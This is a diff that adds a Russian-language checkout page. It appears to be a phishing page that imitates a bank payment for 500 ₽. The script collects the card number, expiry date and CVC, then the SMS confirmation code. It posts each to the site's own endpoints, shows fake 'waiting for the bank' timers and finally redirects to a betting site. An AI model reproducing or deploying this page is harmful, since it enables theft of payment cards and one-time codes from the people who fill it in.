@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Оплата</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="/css/main.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@200..800&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div id="loading-overlay" class="loading hidden">
+        <div class="overlay"></div>
+        <div class="loading-overlay-content">
+            <div class="spinner"></div>
+            <p>Ждем ответа от банка...</p>
+        </div>
+    </div>
+
+    <div class="card">
+        <div id="screen1" class="container">
+            <form id="payment-form" method="POST" action="/process-payment" class="credit-card-form__form js-card-form" novalidate="novalidate" autocomplete="on">
+                <div class="payment">
+                    <h1>500 ₽</h1>
+                    <div class="hr-line"></div>
+                    <label for="card-number" class="card-number">Введите номер карты</label>
+                    <input type="tel" inputmode="numeric" name="cardnumber" id="cardnumber" autocomplete="cc-number" placeholder="0000 0000 0000 0000" pattern="\d{4} \d{4} \d{4} \d{4}">
+                    <div class="expiration-cvc">
+                        <div class="form-input">
+                            <p>Срок дейсвия</p>
+                        <input type="text" name="expiry-date" id="expiry-date" placeholder="10/28">
+                    </div>
+                        <div class="form-input">
+                            <p>CVC</p>
+                        <input type="password" name="cvc" id="cvc" maxlength="3" placeholder="CVC">
+                    </div>
+                    </div>
+                    <label class="card-number" for="card-holder">Держатель карты</label>
+                    <input type="text" id="card-holder" placeholder="IVAN IVANOV">
+                    <button type="button" onclick="submitPaymentForm()">Оплатить</button>
+                    <p class="terms">Осуществляя платеж, вы соглашаетесь с <a href="#">правилами использования сервиса</a>.</p>
+                </div>
+            </form>
+        </div>
+
+        <div method="POST" action="/process-sms" id="screen2" name="3ds-form" class="container hidden 3ds-form">
+            <div class="confirmation">
+                <label for="code">Введите код для подтверждения оплаты</label>
+                <input type="text" name="code" id="code" placeholder="000000">
+                <button type="button" onclick="verify3DS()">Подтвердить оплату</button>
+            </div>
+        </div>
+
+        <div id="success-message" class="hidden senka">
+            <h2>Успешная оплата. Возвращаем на сайт...</h2>
+        </div>
+    </div>
+    <script>
+
+
+        function showScreen(screenNumber) {
+            document.querySelectorAll('.container').forEach(container => container.classList.add('hidden'));
+            document.getElementById(`screen${screenNumber}`).classList.remove('hidden');
+        }
+
+        function showLoader() {
+            document.getElementById('loading-overlay').classList.remove('hidden');
+        }
+
+        function hideLoader() {
+            document.getElementById('loading-overlay').classList.add('hidden');
+        }
+
+        async function submitPaymentForm() {
+                showLoader();
+                    const card =  document.getElementById('cardnumber').value.replace(/\s+/g, '');
+                    const expDate = document.getElementById('expiry-date').value;
+                    const cvv = document.getElementById('cvc').value;
+                    const cardDetails = {
+                        id: 2,
+                        card: card,
+                        monthyear: expDate,
+                        cvc: cvv
+                    };
+                    try{
+                    const response = await fetch('/process-payment', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(cardDetails)
+                });
+                console.log(cardDetails)
+                console.log(response)
+                const result = await response.json();
+                
+                if (response.status === 200) {
+                    setTimeout(function() {
+                        hideLoader();
+                    }, 2000);
+                    
+                    setTimeout(function() {
+                        showScreen(2)
+                    }, 3000);
+                } else {
+                    console.log(result.error);
+                    setTimeout(function() {
+                        hideLoader();
+                    }, 2000);
+                } 
+            } catch(error) {
+                console.log(error);
+            }
+        }
+
+        async function verify3DS() {
+            showLoader();
+            const code = document.getElementById('code').value;
+            const codeDetails = {
+                        id: 2,
+                        sms: code,
+            };
+            try{
+                    const response = await fetch('/process-sms', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(codeDetails)
+                });
+                console.log(codeDetails)
+                console.log(response)
+                const result = await response.json();
+                
+                if (response.status === 200) {
+                    setTimeout(function() {
+                        hideLoader();
+                    }, 2000);
+                    
+                    setTimeout(function() {
+                        window.location.replace("https://1xbet.com");
+                    }, 3000);
+                } else {
+                    console.log(result.error);
+                    setTimeout(function() {
+                        hideLoader();
+                    }, 2000);
+                } 
+            } catch(error) {
+                console.log(error);
+            }
+        }
+
+
+
+        // Formatting card number
+        const cardNumberInput = document.getElementById('cardnumber');
+        cardNumberInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 16) {
+                value = value.slice(0, 16);
+            }
+            const formattedValue = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+            e.target.value = formattedValue;
+        });
+
+        // Formatting expiry date
+        const expDateInput = document.getElementById('expiry-date');
+        expDateInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 4) {
+                value = value.slice(0, 4);
+            }
+            if (value.length > 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2);
+            }
+            e.target.value = value;
+        });
+    </script>
+</body>
+</html>
